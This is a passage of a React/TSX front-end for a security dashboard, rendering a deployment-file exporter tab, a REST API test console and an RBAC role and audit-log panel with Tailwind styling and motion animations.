                          plugin.enabled ? 'translate-x-8 shadow' : 'translate-x-0'
                        }`} />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </motion.div>
          )}

          {/* -------------------------------------------------- */}
          {/* TAB 4: DEPLOYMENT CENTER & BOILERPLATE CODES */}
          {/* -------------------------------------------------- */}
          {activeTab === 'exporter' && (
            <motion.div
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="grid grid-cols-1 lg:grid-cols-5 gap-6"
            >
              {/* Left Column: file trees */}
              <div className="lg:col-span-2 space-y-4">
                <div className="bg-slate-900 border border-slate-800 p-5 rounded space-y-4">
                  <div className="flex items-center space-x-2 text-sky-400">
                    <Download className="w-5 h-5 animate-pulse" />
                    <h4 className="font-mono font-bold tracking-wider text-sm text-white">DEPLOYMENT ARCHITECTURE EXPORTER</h4>
                  </div>
                  
                  <p className="text-xs text-slate-400 font-sans leading-relaxed">
                    Download complete, production-ready source files configured with a FastAPI Docker-Compose back-end
                    and an offline-first Flutter Android Client matching your security specifications.
                  </p>

                  {/* Active modules specs listed */}
                  <div className="p-3 bg-slate-950 border border-slate-800 rounded space-y-2 text-xs font-mono">
                    <div className="flex justify-between text-slate-500">
                      <span>DATABASE LAYER:</span>
                      <span className="text-emerald-400">POSTGRESQL // DRIZZLE</span>
                    </div>
                    <div className="flex justify-between text-slate-500">
                      <span>CACHE ACCELERATOR:</span>
                      <span className="text-emerald-400">REDIS CONTAINER</span>
                    </div>
                    <div className="flex justify-between text-slate-500">
                      <span>S3 COMPLIANT COGNITIVE STORE:</span>
                      <span className="text-emerald-400">MINIO SANDBOX</span>
                    </div>
                    <div className="flex justify-between text-slate-500">
                      <span>TOKEN AUTH:</span>
                      <span className="text-emerald-400">JWT HYBRID RBAC</span>
                    </div>
                  </div>

                  {/* File browser */}
                  <div className="space-y-1.5 font-mono text-xs">
                    <span className="text-[10px] font-mono text-slate-500 tracking-wider">PROJECT CONFIG BOILERPLATES:</span>
                    <div className="space-y-1">
                      {Object.keys(DEPLOYMENT_FILES).map((key) => {
                        const file = DEPLOYMENT_FILES[key as keyof typeof DEPLOYMENT_FILES];
                        const isSelected = selectedExportFileKey === key;
                        return (
                          <button
                            key={key}
                            onClick={() => setSelectedExportFileKey(key as keyof typeof DEPLOYMENT_FILES)}
                            className={`w-full flex items-center justify-between px-3 py-2 rounded border text-left transition-all ${
                              isSelected
                                ? 'bg-sky-500/10 border-sky-500/40 text-sky-400'
                                : 'bg-slate-950 border-slate-800/80 text-slate-400 hover:text-slate-300'
                            }`}
                          >
                            <div className="flex items-center space-x-2 truncate">
                              <FileCode className={`w-4 h-4 shrink-0 ${isSelected ? 'text-sky-400' : 'text-slate-600'}`} />
                              <span className="font-bold font-mono text-[11px] truncate">{file.name}</span>
                            </div>
                            <span className="text-[9px] text-slate-500 italic shrink-0">{file.lang}</span>
                          </button>
                        );
                      })}
                    </div>
                  </div>
                </div>

                {/* Exporter actions card */}
                <div className="bg-slate-900 border border-slate-800 p-4 rounded space-y-3 font-mono text-xs">
                  <span className="text-slate-300 font-bold block">EXPORT ENTIRE BUNDLE ZIP:</span>
                  <p className="text-slate-400 font-sans text-xs leading-relaxed">
                    Instantly package all clean architectural files into your local files on Kali Linux for rapid server building.
                  </p>
                  <button
                    onClick={() => {
                      // Prompt downloading the files sequential download helper
                      Object.keys(DEPLOYMENT_FILES).forEach((key) => {
                        const file = DEPLOYMENT_FILES[key as keyof typeof DEPLOYMENT_FILES];
                        downloadFileOnDisk(file.name, file.code);
                      });
                      setAuditLogs(prev => [
                        { timestamp: new Date().toTimeString().split(' ')[0], role: rbacRole, event: 'Downloaded modular deployment stack files directly', severity: 'Info' },
                        ...prev
                      ]);
                    }}
                    className="w-full py-2 bg-sky-500/20 hover:bg-sky-500/30 text-sky-400 border border-sky-500/30 rounded font-bold flex items-center justify-center space-x-2"
                  >
                    <Download className="w-4 h-4" />
                    <span>DOWNLOAD ALL CODE FILES (.ZIP)</span>
                  </button>
                </div>
              </div>

              {/* Right Column: code sandbox view */}
              <div className="lg:col-span-3">
                <div className="bg-slate-900 border border-slate-800 rounded flex flex-col h-full min-h-[500px]">
                  <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/40 font-mono text-xs">
                    <div>
                      <span className="text-slate-400">ACTIVE COMPONENT PATH: </span>
                      <span className="text-sky-400 font-bold">{DEPLOYMENT_FILES[selectedExportFileKey].path}</span>
                    </div>

                    <div className="flex items-center space-x-2">
                      <button
                        onClick={() => copyToClipboard(DEPLOYMENT_FILES[selectedExportFileKey].code)}
                        className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-750 text-slate-300 rounded border border-slate-700 flex items-center space-x-1.5"
                      >
                        <Copy className="w-3.5 h-3.5 text-sky-400" />
                        <span>{isCopied ? 'COPIED!' : 'COPY'}</span>
                      </button>
                      <button
                        onClick={() => downloadFileOnDisk(DEPLOYMENT_FILES[selectedExportFileKey].name, DEPLOYMENT_FILES[selectedExportFileKey].code)}
                        className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-750 text-slate-300 rounded border border-slate-700 flex items-center space-x-1.5"
                      >
                        <Download className="w-3.5 h-3.5" />
                        <span>SAVE</span>
                      </button>
                    </div>
                  </div>

                  <div className="p-4 flex-1 overflow-auto max-h-[550px] custom-scrollbar bg-slate-950 font-mono text-[11px] leading-relaxed text-slate-300 whitespace-pre">
                    {DEPLOYMENT_FILES[selectedExportFileKey].code}
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {/* -------------------------------------------------- */}
          {/* TAB 5: REST API OpenAPI SANDBOX */}
          {/* -------------------------------------------------- */}
          {activeTab === 'api-console' && (
            <motion.div
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="grid grid-cols-1 lg:grid-cols-5 gap-6"
            >
              {/* Left Column: API settings */}
              <div className="lg:col-span-2 space-y-4">
                <div className="bg-slate-900 border border-slate-800 p-5 rounded space-y-4">
                  <div className="flex items-center space-x-2 text-purple-400">
                    <Globe className="w-5 h-5 animate-pulse" />
                    <h4 className="font-mono font-bold tracking-wider text-sm text-white">REST SANDBOX // INTERACTIVE SWAGGER</h4>
                  </div>
                  
                  <p className="text-xs text-slate-400 font-sans leading-relaxed">
                    Execute real server-side REST requests using JWT authentication headers. Confirm payload validations
                    and inspect real JSON outputs.
                  </p>

                  {/* Port and host settings */}
                  <div className="grid grid-cols-3 gap-2 font-mono text-xs">
                    <div className="col-span-2 space-y-1">
                      <label className="text-slate-500">HOST TARGET:</label>
                      <input
                        type="text"
                        value={apiHost}
                        onChange={(e) => setApiHost(e.target.value)}
                        className="w-full bg-slate-950 border border-slate-800 p-2 rounded text-slate-300 focus:outline-none focus:border-purple-500 font-mono"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-slate-500">PORT:</label>
                      <input
                        type="text"
                        value={apiPort}
                        onChange={(e) => setApiPort(e.target.value)}
                        className="w-full bg-slate-950 border border-slate-800 p-2 rounded text-slate-300 focus:outline-none focus:border-purple-500 font-mono"
                      />
                    </div>
                  </div>

                  {/* Endpoints checklist */}
                  <div className="space-y-2 font-mono text-xs">
                    <span className="text-[10px] font-mono text-slate-500 tracking-wider">AVAILABLE REST ENDPOINTS:</span>
                    <div className="space-y-1">
                      <button
                        type="button"
                        onClick={() => setSelectedEndpoint('health')}
                        className={`w-full flex items-center justify-between px-3 py-2 rounded border text-left transition-all ${
                          selectedEndpoint === 'health'
                            ? 'bg-purple-500/10 border-purple-500/40 text-purple-400'
                            : 'bg-slate-950 border-slate-800/80 text-slate-400'
                        }`}
                      >
                        <div className="flex items-center space-x-2">
                          <span className="text-[9px] bg-emerald-500/20 text-emerald-400 px-1 py-0.5 rounded font-bold">GET</span>
                          <span className="font-mono text-[11px]">/health</span>
                        </div>
                        <span className="text-[9px] text-slate-500">Public Status</span>
                      </button>

                      <button
                        type="button"
                        onClick={() => setSelectedEndpoint('threats')}
                        className={`w-full flex items-center justify-between px-3 py-2 rounded border text-left transition-all ${
                          selectedEndpoint === 'threats'
                            ? 'bg-purple-500/10 border-purple-500/40 text-purple-400'
                            : 'bg-slate-950 border-slate-800/80 text-slate-400'
                        }`}
                      >
                        <div className="flex items-center space-x-2">
                          <span className="text-[9px] bg-emerald-500/20 text-emerald-400 px-1 py-0.5 rounded font-bold">GET</span>
                          <span className="font-mono text-[11px]">/api/threats</span>
                        </div>
                        <span className="text-[9px] text-slate-500">Requires JWT</span>
                      </button>

                      <button
                        type="button"
                        onClick={() => setSelectedEndpoint('test_host')}
                        className={`w-full flex items-center justify-between px-3 py-2 rounded border text-left transition-all ${
                          selectedEndpoint === 'test_host'
                            ? 'bg-purple-500/10 border-purple-500/40 text-purple-400'
                            : 'bg-slate-950 border-slate-800/80 text-slate-400'
                        }`}
                      >
                        <div className="flex items-center space-x-2">
                          <span className="text-[9px] bg-purple-500/20 text-purple-400 px-1 py-0.5 rounded font-bold">POST</span>
                          <span className="font-mono text-[11px]">/api/test-endpoint</span>
                        </div>
                        <span className="text-[9px] text-slate-500">DNS Resolution</span>
                      </button>
                    </div>
                  </div>

                  {/* Send Request Trigger */}
                  <button
                    onClick={handleExecuteApiCall}
                    disabled={apiLoading}
                    className="w-full py-2.5 bg-purple-500/15 hover:bg-purple-500/25 text-purple-400 border border-purple-500/30 rounded font-bold font-mono text-xs flex items-center justify-center space-x-2 cursor-pointer transition-all"
                  >
                    {apiLoading ? (
                      <RefreshCw className="w-4 h-4 animate-spin" />
                    ) : (
                      <Play className="w-4 h-4 text-purple-400" />
                    )}
                    <span>EXECUTE API QUERY</span>
                  </button>
                </div>

                {/* Secure Auth Info panel */}
                <div className="bg-slate-900/40 border border-slate-800 p-4 rounded text-xs text-slate-400 font-sans space-y-2">
                  <span className="text-slate-300 font-bold block font-mono">AUTHENTICATION STATUS:</span>
                  <div className="flex items-center space-x-2">
                    <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
                    <span className="text-slate-400 font-mono">JWT Bearer: [ACTIVE_JWT_VERIFIED]</span>
                  </div>
                  <p className="text-[11px] leading-relaxed">
                    CORS settings are pre-configured server-side to allow incoming security client Handshakes safely.
                  </p>
                </div>
              </div>

              {/* Right Column: response json code display */}
              <div className="lg:col-span-3">
                <div className="bg-slate-900 border border-slate-800 rounded flex flex-col h-full min-h-[480px]">
                  <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/40 font-mono text-xs">
                    <span className="font-bold text-white uppercase">INTERACTIVE HTTP CLIENT OUT</span>
                    {apiResponseJson && (
                      <span className="font-bold text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">
                        STATUS: {apiResponseJson.status || 200} OK
                      </span>
                    )}
                  </div>

                  <div className="p-4 flex-1 bg-slate-950 overflow-auto max-h-[500px] custom-scrollbar text-slate-300 font-mono text-[11px] leading-relaxed">
                    {apiLoading ? (
                      <div className="flex flex-col items-center justify-center h-full py-20 text-slate-500">
                        <RefreshCw className="w-8 h-8 animate-spin text-purple-400 mb-2" />
                        <span className="animate-pulse">STREAMING RESPONSE PAYLOAD...</span>
                      </div>
                    ) : apiResponseJson ? (
                      <div>
                        {/* Headers */}
                        <div className="text-slate-500 border-b border-slate-850 pb-2 mb-2 space-y-1">
                          <p>&gt; Request URL: {apiResponseJson.url || "http://localhost:8000"}</p>
                          <p>&gt; User-Agent: aegis-cyber-intel-deck</p>
                          <p>&gt; Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</p>
                        </div>
                        {/* Body formatted */}
                        <pre className="text-emerald-400">
                          {JSON.stringify(apiResponseJson.data || apiResponseJson, null, 2)}
                        </pre>
                      </div>
                    ) : (
                      <div className="flex flex-col items-center justify-center h-full text-center py-20 text-slate-500">
                        <Globe className="w-12 h-12 mb-3 text-slate-700" />
                        <h5 className="text-slate-400 font-bold">AWAITING CLIENT MUTATION</h5>
                        <p className="max-w-md mt-1 leading-relaxed text-[11px]">
                          Select a REST endpoint method in the console panel and click &quot;Execute&quot; to watch server queries resolve.
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {/* -------------------------------------------------- */}
          {/* TAB 6: RBAC & AUDIT LOGS PANEL */}
          {/* -------------------------------------------------- */}
          {activeTab === 'rbac-audit' && (
            <motion.div
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="space-y-6"
            >
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                
                {/* Security Clearance Configuration Controls */}
                <div className="bg-slate-900 border border-slate-800 p-5 rounded space-y-4 lg:col-span-1 bg-slate-900/60">
                  <div className="flex items-center space-x-2 text-rose-400">
                    <UserCheck className="w-5 h-5" />
                    <h4 className="font-mono font-bold tracking-wider text-sm text-white uppercase">RBAC USER CLEARANCE DECK</h4>
                  </div>
                  
                  <p className="text-xs text-slate-400 font-sans leading-relaxed">
                    Configure active RBAC operational controls. ReadOnly roles are locked out from system alterations to guarantee SOC integrity.
                  </p>

                  <div className="space-y-3 font-mono text-xs">
                    <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider block">CLEARANCE SPECS:</span>
                    
                    <div className="p-3 bg-slate-950 rounded border border-slate-850 space-y-2">
                      <div className="flex items-center justify-between text-white font-bold">
                        <span>ADMINISTRATOR</span>
                        <Unlock className="w-3.5 h-3.5 text-red-400" />
                      </div>
                      <p className="text-[11px] text-slate-400 leading-relaxed font-sans">
                        Full CRUD database authorization. Capable of installing modular plugins, hot-toggling security configurations, and generating code assets.
                      </p>
                    </div>

                    <div className="p-3 bg-slate-950 rounded border border-slate-850 space-y-2">
                      <div className="flex items-center justify-between text-white font-bold">
                        <span>ANALYST</span>
                        <Unlock className="w-3.5 h-3.5 text-emerald-400" />
                      </div>
                      <p className="text-[11px] text-slate-400 leading-relaxed font-sans">
                        Authorized to review alert histories, perform AI log evaluations, and utilize REST debug utilities. No administrative plugin installations.
                      </p>
                    </div>

                    <div className="p-3 bg-slate-950 rounded border border-slate-850 space-y-2">
                      <div className="flex items-center justify-between text-slate-400 font-bold">
                        <span>GUEST (READ-ONLY)</span>
                        <Lock className="w-3.5 h-3.5 text-amber-500" />
                      </div>
                      <p className="text-[11px] text-slate-500 leading-relaxed font-sans">
                        Restricted to active dashboards. All active write configurations or plugin modifications are fully disabled and rejected by internal filters.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Audit Logs Lists table */}
                <div className="bg-slate-900 border border-slate-800 rounded lg:col-span-2 flex flex-col justify-between">
                  <div>
                    <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/40">
                      <div className="flex items-center space-x-2">
                        <Terminal className="w-4 h-4 text-rose-400" />
                        <h4 className="font-mono font-bold text-xs tracking-wider text-white uppercase">ACTIVE SYSTEM SECURITY AUDITS</h4>
                      </div>
                      <button
                        onClick={() => {
                          setAuditLogs([
                            { timestamp: new Date().toTimeString().split(' ')[0], role: 'System', event: 'Audits ledger reset by administrator', severity: 'Warning' }
                          ]);
                        }}
                        className="px-2 py-1 bg-slate-800 hover:bg-slate-750 text-slate-400 border border-slate-700 text-[10px] font-mono rounded"
                      >
                        RESET LEDGER
                      </button>
                    </div>

                    <div className="overflow-y-auto max-h-[460px] custom-scrollbar font-mono text-xs divide-y divide-slate-850">
                      {auditLogs.map((log, idx) => (
                        <div key={idx} className="p-3 hover:bg-slate-850/30 transition-all space-y-1">
                          <div className="flex items-center justify-between">
                            <span className="text-slate-500 text-[10px]">{log.timestamp}</span>
                            <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold ${
                              log.severity === 'Critical' ? 'bg-red-500/10 text-red-400' :
                              log.severity === 'Warning' ? 'bg-amber-500/10 text-amber-400' :
                              'bg-cyan-500/10 text-cyan-400'
                            }`}>
                              {log.role}
                            </span>
                          </div>
                          <p className="text-slate-300 text-[11px] leading-relaxed">{log.event}</p>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="p-3 bg-slate-950 border-t border-slate-850 text-[10px] font-mono text-slate-500 flex justify-between items-center">
                    <span>LEDGER COMPLIANCY LEVEL: 100% SECURE</span>
                    <span>MUTABLE: FALSE</span>
                  </div>
                </div>

              </div>
            </motion.div>
          )}

        </div>

      </main>
    </div>
  );
}
